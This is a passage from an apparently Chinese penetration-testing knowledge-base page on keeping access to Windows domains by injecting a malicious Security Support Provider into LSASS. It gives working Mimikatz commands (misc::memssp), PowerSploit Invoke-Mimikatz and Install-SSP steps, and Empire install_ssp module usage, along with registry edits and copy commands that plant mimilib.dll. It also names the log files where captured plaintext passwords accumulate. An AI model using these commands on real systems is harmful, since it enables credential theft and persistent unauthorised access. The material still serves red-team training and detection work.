onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>查看“安全软件包”注册表项将验证是否已注入恶意安全支持提供程序。</p>
<pre tabindex="0"><code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</code></pre><p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/894761-20191111133629156-1972426718.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111133629156-1972426718.png" alt="img" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111133629156-1972426718.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111133629156-1972426718.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111133629156-1972426718.png?size=large 2x" data-title="img" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>由于注册表已被篡改并且DLL存储在系统中，因此该方法将在重新启动后继续存在。当域用户再次通过系统进行身份验证时，将创建一个名为kiwissp的新文件，该文件将记录帐户的凭据。</p>
<pre tabindex="0"><code>C:\Windows\System32\kiwissp.log</code></pre><p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/894761-20191111133654275-293344594.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111133654275-293344594.png" alt="img" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111133654275-293344594.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111133654275-293344594.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111133654275-293344594.png?size=large 2x" data-title="img" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<h4 id="方法二" class="heading-element"><span>方法二</span>
  <a href="#%e6%96%b9%e6%b3%95%e4%ba%8c" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p>Mimikatz通过向LSASS注入新的安全支持提供程序（SSP）来支持内存技术选项。此技术不需要将mimilib.dll放入磁盘或创建注册表项。但是，缺点是在重新启动过程中不会持续存在。</p>
<pre tabindex="0"><code>privilege::debug
misc::memssp</code></pre><p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/894761-20191111133714579-1576487799.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111133714579-1576487799.png" alt="img" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111133714579-1576487799.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111133714579-1576487799.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111133714579-1576487799.png?size=large 2x" data-title="img" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>当用户再次通过系统进行身份验证时，将在System32中创建一个日志文件，其中将包含纯文本用户密码。</p>
<pre tabindex="0"><code>C:\Windows\System32\mimilsa.log</code></pre><p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/894761-20191111133731269-394907794.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111133731269-394907794.png" alt="img" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111133731269-394907794.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111133731269-394907794.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111133731269-394907794.png?size=large 2x" data-title="img" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<h1 id="powersploit-1" class="heading-element"><span>PowerSploit</span>
  <a href="#powersploit-1" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><p><a href="https://github.com/PowerShellMafia/PowerSploit"target="_blank" rel="external nofollow noopener noreferrer">PowerSploit</a>包含两个可以执行相同任务的脚本。在Mimikatz的PowerShell变体“ <strong>Invoke-Mimikatz</strong> ”中，执行以下命令将使用内存中技术。</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#58a1dd">Import</span><span style="color:#ff636f">-</span><span style="color:#58a1dd">Module</span> <span style="color:#ff636f">.</span>\<span style="color:#58a1dd">Invoke</span><span style="color:#ff636f">-</span><span style="color:#58a1dd">Mimikatz</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">ps1</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">Invoke</span><span style="color:#ff636f">-</span><span style="color:#58a1dd">Mimikatz</span> <span style="color:#ff636f">-</span><span style="color:#58a1dd">Command</span> <span style="color:#a6be9d">&#34;misc::memssp&#34;</span></span></span></code></pre></div><p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/894761-20191111133929436-353413364.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111133929436-353413364.png" alt="PowerSploit – Mimikatz SSP" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111133929436-353413364.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111133929436-353413364.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111133929436-353413364.png?size=large 2x" data-title="PowerSploit – Mimikatz SSP" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>或者，将恶意的SSP DDL文件传输到目标主机并使用模块<strong>Install-SSP</strong>将DLL复制到System32，并将自动修改相关的注册表项。</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#58a1dd">Import</span><span style="color:#ff636f">-</span><span style="color:#58a1dd">Module</span> <span style="color:#ff636f">.</span>\<span style="color:#58a1dd">PowerSploit</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">psm1</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">Install</span><span style="color:#ff636f">-</span><span style="color:#58a1dd">SSP</span> <span style="color:#ff636f">-</span><span style="color:#58a1dd">Path</span> <span style="color:#ff636f">.</span>\<span style="color:#58a1dd">mimilib</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">dll</span></span></span></code></pre></div><p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/894761-20191111133946939-1698762253.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111133946939-1698762253.png" alt="PowerSploit –安装SSP" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111133946939-1698762253.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111133946939-1698762253.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111133946939-1698762253.png?size=large 2x" data-title="PowerSploit –安装SSP" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<h1 id="empire-2" class="heading-element"><span>Empire</span>
  <a href="#empire-2" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><p>Empire提供了两个模块，可用于枚举现有的SSP并在目标系统上安装恶意的SSP。默认情况下，枚举模块将使用活动代理，并且不需要任何其他配置。</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>usemodule persistence/misc/get_ssps
</span></span><span style="display:flex;"><span>execute</span></span></code></pre></div><p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/894761-20191111133747470-1690785944.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111133747470-1690785944.png" alt="Empire – SSP 枚举" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111133747470-1690785944.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111133747470-1690785944.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111133747470-1690785944.png?size=large 2x" data-title="Empire – SSP 枚举" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>同样，直接查询注册表可以获取存在的SSP的值。</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#58a1dd">shell</span> <span style="color:#58a1dd">reg</span> <span style="color:#58a1dd">query</span> <span style="color:#58a1dd">hklm</span>\<span style="color:#58a1dd">system</span>\<span style="color:#58a1dd">currentcontrolset</span>\<span style="color:#58a1dd">control</span>\<span style="color:#58a1dd">lsa</span>\ <span style="color:#ff636f">/</span><span style="color:#58a1dd">v</span> <span style="color:#a6be9d">&#34;Security Packages&#34;</span></span></span></code></pre></div><p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/894761-20191111133806575-1829369263.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111133806575-1829369263.png" alt="注册表SSP的枚举注册表" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111133806575-1829369263.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111133806575-1829369263.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111133806575-1829369263.png?size=large 2x" data-title="注册表SSP的枚举注册表" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>将恶意安全支持提供程序复制到System32并更新注册表项将结束该技术。</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#58a1dd">shell</span> <span style="color:#58a1dd">copy</span> <span style="color:#58a1dd">mimilib</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">dll</span> <span style="color:#58a1dd">C</span>:\<span style="color:#58a1dd">Windows</span>\<span style="color:#58a1dd">System32</span>\</span></span></code></pre></div><p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/894761-20191111133823263-1377394559.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111133823263-1377394559.png" alt=" 将mimilib.dll复制到System32" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111133823263-1377394559.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111133823263-1377394559.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111133823263-1377394559.png?size=large 2x" data-title=" 将mimilib.dll复制到System32" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>由于Empire包含一个模块，该过程可以自动进行，该模块将自动将DLL文件复制到System32并创建注册表项。唯一的要求是在主机上设置mimilib.dll文件的路径。</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#58a1dd">usemodule</span> <span style="color:#58a1dd">persistence</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">misc</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">install_ssp</span><span style="color:#ff636f">*</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">set</span> <span style="color:#58a1dd">Path</span> <span style="color:#58a1dd">C</span>:\<span style="color:#58a1dd">Users</span>\<span style="color:#58a1dd">Administrator</span>\<span style="color:#58a1dd">mimilib</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">dll</span>
